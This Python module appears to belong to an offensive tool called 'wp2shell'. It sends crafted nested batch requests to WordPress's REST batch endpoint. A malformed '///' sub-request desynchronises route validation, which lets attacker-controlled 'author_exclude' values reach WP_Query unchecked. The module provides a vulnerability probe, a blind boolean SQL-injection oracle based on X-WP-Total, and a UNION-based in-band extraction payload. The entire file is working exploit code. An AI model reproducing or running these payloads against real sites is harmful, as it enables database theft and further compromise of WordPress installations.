"""HTTP transport and construction of the nested batch route-confusion payloads."""

from __future__ import annotations

import json
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any, Optional

# A deliberately malformed path (no host, no port) for which wp_parse_url() returns false.
# The client never dials it; its only job is to seed one WP_Error into the batch's request
# list, which is what desynchronises $matches from $validation so a sub-request is dispatched
# under the following sub-request's handler. Any parse_url()-rejecting string works; "///" is
# used so it cannot be mistaken for a network target.
_DESYNC_PRIMER = {"method": "POST", "path": "///"}
_BATCH_MARKER_CODES = ("parse_path_failed", "block_cannot_read", "rest_batch_not_allowed")
POSTS_ITEM_SOURCE_PATH = "/wp/v2/posts/999999"


class TargetError(Exception):
    """The target could not be reached (connection refused, DNS failure, timeout)."""


@dataclass
class Response:
    status: int
    elapsed: float
    body: str

    def json(self) -> Any:
        return json.loads(self.body)


class BatchClient:
    """Sends requests to a target's REST batch endpoint and builds injection payloads."""

    def __init__(
        self,
        base_url: str,
        *,
        timeout: float = 30.0,
        proxy: Optional[str] = None,
        user_agent: str = "wp2shell",
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.user_agent = user_agent
        handlers = [urllib.request.ProxyHandler({"http": proxy, "https": proxy})] if proxy else []
        self._opener = urllib.request.build_opener(*handlers)

    @property
    def endpoint(self) -> str:
        # ?rest_route= works on any install (including the plain-permalinks default); /wp-json/ would
        # require pretty permalinks, so this form is always used.
        return f"{self.base_url}/?rest_route=/batch/v1"

    def post(self, payload: dict) -> Response:
        request = urllib.request.Request(
            self.endpoint,
            data=json.dumps(payload).encode(),
            method="POST",
            headers={"Content-Type": "application/json", "User-Agent": self.user_agent},
        )
        start = time.monotonic()
        try:
            resp = self._opener.open(request, timeout=self.timeout)
            status, body = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status, body = exc.code, exc.read().decode("utf-8", "replace")
        except OSError as exc:  # URLError, connection refused, timeout, DNS failure
            reason = getattr(exc, "reason", exc)
            raise TargetError(f"cannot reach {self.endpoint}: {reason}") from None
        return Response(status, time.monotonic() - start, body)

    def get(self, path: str) -> Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        request = urllib.request.Request(
            url,
            method="GET",
            headers={"User-Agent": self.user_agent},
        )
        start = time.monotonic()
        try:
            resp = self._opener.open(request, timeout=self.timeout)
            status, body = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status, body = exc.code, exc.read().decode("utf-8", "replace")
        except OSError as exc:  # URLError, connection refused, timeout, DNS failure
            reason = getattr(exc, "reason", exc)
            raise TargetError(f"cannot reach {url}: {reason}") from None
        return Response(status, time.monotonic() - start, body)

    def marker_probe(self) -> Response:
        """A benign batch that exposes the vulnerable route-confusion alignment bug."""
        return self.post(
            {
                "requests": [
                    _DESYNC_PRIMER,
                    {"method": "POST", "path": "/wp/v2/posts"},
                    {"method": "POST", "path": "/wp/v2/block-renderer/core/archives"},
                    {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
                ]
            }
        )

    @staticmethod
    def batch_marker_codes(response: Response) -> tuple:
        try:
            body = response.json()
        except ValueError:
            return ()

        found = []

        def walk(value) -> None:
            if isinstance(value, dict):
                code = value.get("code")
                if code in _BATCH_MARKER_CODES and code not in found:
                    found.append(code)
                for child in value.values():
                    walk(child)
            elif isinstance(value, list):
                for child in value:
                    walk(child)

        walk(body)
        return tuple(found)

    @staticmethod
    def has_route_confusion_markers(response: Response) -> bool:
        codes = BatchClient.batch_marker_codes(response)
        return all(code in codes for code in _BATCH_MARKER_CODES)

    def inject(self, author_not_in: str) -> Response:
        """Send a payload placing `author_not_in` into the WP_Query author__not_in clause."""
        return self.post(self._payload(author_not_in))

    def union_inject(self, author_not_in: str) -> Response:
        """Send a payload that lands `author_not_in` in a non-split, no-ORDER-BY WP_Query.

        The source request targets the single-post item route ``/wp/v2/posts/999999``, so it
        validates against the item schema and the collection-only params ``author_exclude``,
        ``orderby`` and ``per_page`` pass through unchecked. The inner desync then dispatches it
        under the posts collection handler, which consumes them:

        - ``orderby=none`` removes the trailing ``ORDER BY {posts}.<col>`` that otherwise makes a
          ``UNION`` fail with "cannot be used in global ORDER clause";
        - ``per_page=500`` keeps ``WP_Query`` in full-row (non-split) mode when no persistent object
          cache is in use, so a ``UNION SELECT`` row survives as a fake ``WP_Post``.

        Together these turn the blind sink into in-band UNION extraction (one request per value).
        """
        return self.post(self._union_payload(author_not_in))

    @staticmethod
    def _union_payload(author_not_in: str) -> dict:
        query = urllib.parse.urlencode(
            {"author_exclude": author_not_in, "orderby": "none", "per_page": "500"}
        )
        inner = {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "GET", "path": POSTS_ITEM_SOURCE_PATH + "?" + query},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        return {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }

    def match_count(self, response: Response) -> Optional[int]:
        """Return X-WP-Total (the matched-row count) from the confused get_items response, else None.

        The item-route source carries no ``page``, so the confused collection can paginate to an
        empty ``body`` even when the injected condition matches rows -- but ``X-WP-Total`` still
        reports the true count, so it, not the body list, is the reliable boolean signal.
        """
        try:
            inner = response.json()["responses"][1]["body"]
            headers = inner["responses"][1]["headers"]
        except (KeyError, IndexError, TypeError, ValueError):
            return None
        if not isinstance(headers, dict):
            return None
        try:
            return int(headers.get("X-WP-Total"))
        except (TypeError, ValueError):
            return None

    @staticmethod
    def _payload(author_not_in: str) -> dict:
        # Inner batch: a GET on the single-post item route is validated as an item request, whose
        # schema does not define the posts collection's `author_exclude` param. The desync then
        # dispatches the same request under posts get_items(), which maps author_exclude ->
        # WP_Query author__not_in.
        inner = {
            "requests": [
                _DESYNC_PRIMER,
                {
                    "method": "GET",
                    "path": POSTS_ITEM_SOURCE_PATH
                    + "?author_exclude="
                    + urllib.parse.quote(author_not_in, safe=""),
                },
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
        }
        # Outer batch: a posts request carrying the inner batch as its body is desynced onto the
        # batch handler itself. Validated as a posts request, its `requests` list is never checked
        # against the batch schema, so the inner sub-requests are free to use GET.
        return {
            "requests": [
                _DESYNC_PRIMER,
                {"method": "POST", "path": "/wp/v2/posts", "body": inner},
                {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
            ]
        }
